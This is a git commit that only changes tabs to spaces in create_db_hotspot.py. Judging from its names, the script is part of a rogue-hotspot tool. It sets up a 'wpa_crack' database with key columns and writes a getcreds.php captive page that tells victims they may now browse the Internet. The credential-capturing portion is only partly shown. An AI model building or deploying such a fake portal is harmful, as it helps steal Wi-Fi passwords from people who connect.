f1601a86dd1f959745ac063cc140afbf3552259f
Zdenek Styblik <stybla@turnovfree.net>
2016-01-24 14:37:25 +0100

    Retab create_db_hotspot.py

--- create_db_hotspot.py
+++ create_db_hotspot.py
@@ -5,18 +5,18 @@ print '*'*20
 print "Setting up the database\n"
 
 def connect_to_database():
-	username, password = db_connect_creds.read_creds()
-	db_connection = MySQLdb.connect(host='localhost', user=username, passwd=password)
-	cursor = db_connection.cursor()
-	cursor.execute('CREATE DATABASE IF NOT EXISTS wpa_crack')
-	cursor.execute('USE wpa_crack')
-	cursor.execute('''CREATE TABLE IF NOT EXISTS content (
+    username, password = db_connect_creds.read_creds()
+    db_connection = MySQLdb.connect(host='localhost', user=username, passwd=password)
+    cursor = db_connection.cursor()
+    cursor.execute('CREATE DATABASE IF NOT EXISTS wpa_crack')
+    cursor.execute('USE wpa_crack')
+    cursor.execute('''CREATE TABLE IF NOT EXISTS content (
                       key1 VARCHAR(64), key2 VARCHAR(64)
                       )
                       ''')
 def create_file():
-	phpcreate = open('/var/www/getcreds.php','wb')
-	php = """<?php
+    phpcreate = open('/var/www/getcreds.php','wb')
+    php = """<?php
 $con=mysqli_connect("localhost","root","","wpa_crack");
 // Check connection
 if (mysqli_connect_errno()) {
@@ -37,10 +37,10 @@ echo "Now you may start browsing Internet";
 
 mysqli_close($con);
 ?> """
-	phpcreate.write(php)
-	phpcreate.close()
+    phpcreate.write(php)
+    phpcreate.close()
 
 print "Database and appropriate file is created"
-	
+
 connect_to_database()
 create_file()
